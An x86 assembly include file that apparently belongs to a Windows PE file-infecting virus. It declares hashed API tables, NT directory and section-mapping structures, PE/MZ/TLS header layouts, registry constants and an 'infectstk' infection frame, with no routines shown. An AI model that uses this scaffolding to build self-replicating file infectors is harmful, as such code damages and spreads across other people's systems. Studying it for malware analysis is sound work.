   DLL_PROCESS_ATTACH              equ     1
   DLL_THREAD_ATTACH               equ     2

   MAX_PATH                        equ     260

   FILE_DIRECTORY_FILE             equ     00000001h
   FILE_SYNCHRONOUS_IO_NONALERT    equ     00000020h
   FILE_OPEN_FOR_BACKUP_INTENT     equ     00004000h

   FILE_SHARE_READ                 equ     00000001
   FILE_SHARE_WRITE                equ     00000002

   FILE_READ_DATA                  equ     0001h
   FILE_LIST_DIRECTORY             equ     0001h
   FILE_WRITE_DATA                 equ     0002h
   FILE_APPEND_DATA                equ     0004h
   FILE_WRITE_ATTRIBUTES           equ     0100h

   SYNCHRONIZE                     equ     00100000h

   FileBothDirectoryInformation    equ     3
   FileBasicInformation            equ     4

   FILE_ATTRIBUTE_DIRECTORY        equ     00000010h
   FILE_ATTRIBUTE_ARCHIVE          equ     00000020h

   IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

   IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
   IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
   IMAGE_FILE_32BIT_MACHINE        equ     0100h
   IMAGE_FILE_SYSTEM               equ     1000h
   IMAGE_FILE_DLL                  equ     2000h
   IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

   IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
   IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

   RANDPADMIN                      equ     4096
   RANDPADMAX                      equ     2048    ;RANDPADMIN is added to this

   PAGE_READWRITE                  equ     04

   STANDARD_RIGHTS_REQUIRED        equ     000F0000h
   SECTION_QUERY                   equ     0001
   SECTION_MAP_WRITE               equ     0002
   SECTION_MAP_READ                equ     0004

   IMAGE_SCN_MEM_WRITE             equ     80000000h

   CREATE_ALWAYS                   equ     2

   GENERIC_WRITE                   equ     40000000h

   HKEY_LOCAL_MACHINE              equ     80000002h

   KEY_SET_VALUE                   equ     2

   REG_MULTI_SZ                    equ     7

   align           1                               ;byte-packed structures
   krncrcstk       struct
           kRtlSetCurrentDirectory_U       dd      ?
           kRtlRandom                      dd      ?
           kRtlFreeHeap                    dd      ?
           kRtlDosPathNameToNtPathName_U   dd      ?
           kRtlAllocateHeap                dd      ?
           kNtUnmapViewOfSection           dd      ?
           kNtSetInformationFile           dd      ?
           kNtQueryDirectoryFile           dd      ?
           kNtOpenFile                     dd      ?
           kNtMapViewOfSection             dd      ?
           kNtCreateSection                dd      ?
           kNtClose                        dd      ?
   krncrcstk       ends
   krncrc_count    equ     size krncrcstk shr 2

   execrcstk       struct
           eWriteFile              dd      ?
           eSetFileAttributesA     dd      ?
           eMoveFileA              dd      ?
           eLoadLibraryA           dd      ?
           eGlobalFree             dd      ?
           eGlobalAlloc            dd      ?
           eGetWindowsDirectoryA   dd      ?
           eGetTickCount           dd      ?
           eGetTempFileNameA       dd      ?
           eGetFileAttributesA     dd      ?
           eDeleteFileA            dd      ?
           eCreateFileA            dd      ?
           eCloseHandle            dd      ?
   execrcstk       ends
   execrc_count    equ     size execrcstk shr 2

   regcrcstk       struct
           rRegSetValueExA         dd      ?
           rRegOpenKeyA            dd      ?
           rRegCloseKey            dd      ?
   regcrcstk       ends
   regcrc_count    equ     size regcrcstk shr 2

   tlsstruc        struct
           tlsrawbeg       dd      ?
           tlsrawend       dd      ?
           tlsindex        dd      ?
           tlsfuncptr      dd      ?
           tlsfiller       dd      ?
           tlsflags        dd      ?
           tlsfunc         dd      2 dup (?)
   tlsstruc        ends

   initstk         struct
           initret         dd      ?
           initDLLHandle   dd      ?
           initReason      dd      ?
           initReserved    dd      ?
   initstk         ends

   UNICODE_STRING          struct
           UniLength       dw      ?
           MaximumLength   dw      ?
           Buffer          dd      ?
   UNICODE_STRING          ends

   UNICODE_STRINGDD        struct
           UniString       UNICODE_STRING  ?
           RootDir         dd              ?
   UNICODE_STRINGDD        ends

   LARGE_INTEGER   struct
           dwordLow        dd      ?
           dwordHigh       dd      ?
   LARGE_INTEGER   ends

   FILE_DIRECTORY_INFORMATION      struct
           dirNextEntryOffset      dd              ?
           dirUnknown1             dd              ?
           dirCreationTime         LARGE_INTEGER   ?
           dirLastAccessTime       LARGE_INTEGER   ?
           dirLastWriteTime        LARGE_INTEGER   ?
           dirChangeTime           LARGE_INTEGER   ?
           dirRealFileSize         LARGE_INTEGER   ?
           dirAllocatedSize        LARGE_INTEGER   ?
           dirFileAttributes       dd              ?
           dirFileNameLength       dd              ?
           dirUnknown2             dw              0fh dup (?)
           dirFileName             dw              MAX_PATH + 1 dup (?)
   FILE_DIRECTORY_INFORMATION      ends

   findlist        struct
           findprev        dd                              ?
           findhand        dd                              ?
           findname        UNICODE_STRING                  ?
           findmask        UNICODE_STRINGDD                ?
           finddata        FILE_DIRECTORY_INFORMATION      ?
   findlist        ends

   coffhdr         struct
           pemachine       dw      ?               ;04
           pesectcount     dw      ?               ;06
           petimedate      dd      ?               ;08
           pesymbrva       dd      ?               ;0C
           pesymbcount     dd      ?               ;10
           peopthdrsize    dw      ?               ;14
           peflags         dw      ?               ;16
   coffhdr         ends

   pedir           struct
           dirrva          dd      ?
           dirsize         dd      ?
   pedir           ends

   pehdr           struct
           pesig           dd      ?               ;00
           pecoff          coffhdr <?>
           pemagic         dw      ?               ;18
           pemajorlink     db      ?               ;1A
           peminorlink     db      ?               ;1B
           pecodesize      dd      ?               ;1C
           peidatasize     dd      ?               ;20
           peudatasize     dd      ?               ;24
           peentrypoint    dd      ?               ;28
           pecodebase      dd      ?               ;2C
           pedatabase      dd      ?               ;30
           peimagebase     dd      ?               ;34
           pesectalign     dd      ?               ;38
           pefilealign     dd      ?               ;3C
           pemajoros       dw      ?               ;40
           peminoros       dw      ?               ;42
           pemajorimage    dw      ?               ;44
           peminorimage    dw      ?               ;46
           pemajorsubsys   dw      ?               ;48
           peminorsubsys   dw      ?               ;4A
           pereserved      dd      ?               ;4C
           peimagesize     dd      ?               ;50
           pehdrsize       dd      ?               ;54
           pechksum        dd      ?               ;58
           pesubsys        dw      ?               ;5C
           pedllflags      dw      ?               ;5E
           pestackmax      dd      ?               ;60
           pestacksize     dd      ?               ;64
           peheapmax       dd      ?               ;68
           peheapsize      dd      ?               ;6C
           peldrflags      dd      ?               ;70
           pervacount      dd      ?               ;74
           peexport        pedir   <?>             ;78
           peimport        pedir   <?>             ;80
           persrc          pedir   <?>             ;88
           peexcpt         pedir   <?>             ;90
           pesecurity      pedir   <?>             ;98
           pereloc         pedir   <?>             ;A0
           pedebug         pedir   <?>             ;A8
           pearch          pedir   <?>             ;B0
           peglobal        pedir   <?>             ;B8
           petls           pedir   <?>             ;C0
           peconfig        pedir   <?>             ;C8
           pebound         pedir   <?>             ;D0
           peiat           pedir   <?>             ;D8
           pedelay         pedir   <?>             ;E0
           pecom           pedir   <?>             ;E8
           persrv          pedir   <?>             ;F0
   pehdr           ends

   peexp           struct
           expflags        dd      ?
           expdatetime     dd      ?
           expmajorver     dw      ?
           expminorver     dw      ?
           expdllrva       dd      ?
           expordbase      dd      ?
           expadrcount     dd      ?
           expnamecount    dd      ?
           expadrrva       dd      ?
           expnamerva      dd      ?
           expordrva       dd      ?
   peexp           ends

   tib     struct
           ExceptReg       dd      ?
           StackBase       dd      ?
           StackLimit      dd      ?
           SubSystem       dd      ?
           FiberData       dd      ?
           UserPointer     dd      ?
           TibSelf         dd      ?
           TibUnknown      dd      5 dup (?)
           TibTeb          dd      ?
   tib     ends

   teb     struct
           tebUnknown      dd      6 dup (?)
           heaphand        dd      ?
   teb     ends

   OBJECT_ATTRIBUTES       struct
           ObjLength                       dd      ?
           RootDirectory                   dd      ?
           ObjectName                      dd      ?
           Attributes                      dd      ?
           SecurityDescriptor              dd      ?
           SecurityQualityOfService        dd      ?
   OBJECT_ATTRIBUTES       ends

   openstk         struct
           openobj         OBJECT_ATTRIBUTES       <?>
           openname        UNICODE_STRING          <?>
           openedi         dd                      ?
           openebx         dd                      ?
   openstk         ends

   FILE_BASIC_INFORMATION  struct
           basCreationTime         LARGE_INTEGER       ?
           basLastAccessTime       LARGE_INTEGER       ?
           basLastWriteTime        LARGE_INTEGER       ?
           basChangeTime           LARGE_INTEGER       ?
           basFileAttributes       dd                  ?
           basUnknown              dd                  ?       ;missing from docs?
   FILE_BASIC_INFORMATION  ends

   mzhdr           struct
           mzsig           dw      ?               ;00
           mzpagemod       dw      ?               ;02
           mzpagediv       dw      ?               ;04
           mzrelocs        dw      ?               ;06
           mzhdrsize       dw      ?               ;08
           mzminalloc      dw      ?               ;0A
           mzmaxalloc      dw      ?               ;0C
           mzss            dw      ?               ;0E
           mzsp            dw      ?               ;10
           mzchksum        dw      ?               ;12
           mzip            dw      ?               ;14
           mzcs            dw      ?               ;16
           mzreloff        dw      ?               ;18
           mzfiller        db      22h dup (?)     ;1A
           mzlfanew        dd      ?               ;3C
   mzhdr           ends

   pesect          struct
           sectname        db      8 dup (?)
           sectvirtsize    dd      ?
           sectvirtaddr    dd      ?
           sectrawsize     dd      ?
           sectrawaddr     dd      ?
           sectreladdr     dd      ?
           sectlineaddr    dd      ?
           sectrelcount    dw      ?
           sectlinecount   dw      ?
           sectflags       dd      ?
   pesect          ends

   mapsehstk       struct
           mapsehprev      dd      ?
           mapsehexcpt     dd      ?
           mapsehregs      dd      8 dup (?)
           mapsehsehret    dd      ?
           mapsehinfret    dd      ?
   mapsehstk       ends

   infectstk       struct
           infdelta        dd              ?
           infmapview      dd              ?
           inffilesize     dd              ?
           infseh          mapsehstk       <?>
   infectstk       ends
   align                                           ;restore default alignment
